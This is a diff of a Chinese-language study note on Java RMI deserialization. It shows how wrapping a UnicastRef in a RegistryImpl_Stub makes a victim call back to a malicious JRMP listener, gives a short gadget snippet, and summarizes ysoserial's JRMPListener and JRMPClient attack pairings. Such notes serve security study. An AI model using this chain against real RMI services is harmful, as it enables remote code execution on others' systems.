+之前说过，每个远程对象`RemoteObject`都有一个`RemoteRef`作为其远程引用，上一条链子的`UnicastRef`也是`RemoteRef`的子类。`RemoteObject#readObject`会先恢复`ref`属性，就会调用到它的`readExternal`了
+
+![image-20240224130313035](./../.gitbook/assets/image-20240224130313035.png)
+
+随便找一个`RemoteObject`的子类，将`UnicastRef`作为其`ref`属性，接下来和上面的链子一样。对应`ysoserial.payloads.JRMPClient`，不过它是用的`RemoteObjectInvocationHandler`，也就是创建动态代理Stub那一套
+
+```java
+ObjID id = new ObjID(new Random().nextInt());
+TCPEndpoint te = new TCPEndpoint("127.0.0.1", 12233);
+UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+RegistryImpl_Stub stub = new RegistryImpl_Stub(ref);
+ser(stub);
+```
+
+## Summary
+
+总结一下：
+
+> * exploit
+>   * JRMPListner：构造恶意JRMP服务器，返回异常让客户端反序列化 `StreamRemoteCall#executeCall`
+>   * JRMPClient：发送恶意序列化数据，打DGC服务 `DGCImpl_Skel#dispatch`
+> * payloads
+>   * JRMPListner：`UnicastRemoteObject`反序列化时会导出对象，触发JRMP监听端口，配合exploit.JRMPClient打
+>   * JRMPClient：`UnicastRef`反序列化时会触发DGC的`ditry`，配合exploit.JRMPListner打
+
+注意到上面的反序列化链子最终触发的还是反序列化，因此JRMP适用于二次反序列化。
+
+后面还有JEP290的RMI绕过，放后面去讲了。
+
+# 0x08 Ref
 
 * https://su18.org/post/rmi-attack 👍
+
